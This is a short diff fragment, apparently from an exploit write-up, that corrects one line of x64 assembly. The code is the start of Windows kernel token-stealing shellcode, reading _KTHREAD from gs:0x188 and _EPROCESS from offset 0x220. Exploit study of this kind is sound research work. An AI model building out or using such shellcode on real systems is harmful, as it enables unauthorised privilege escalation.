@@ -702,7 +702,7 @@ section .text
 
 	mov r8, qword [gs:0x188]					; Get _KTHREAD Address into r8
 	mov r8, qword [r8 + 0x220]					; Get _EPROCESS Address
-	mov r8, rcx									; save Exploit process' _EPROCESS structure on rcx
+	mov rcx, r8									; save Exploit process' _EPROCESS structure on rcx
 ...
 ```
 
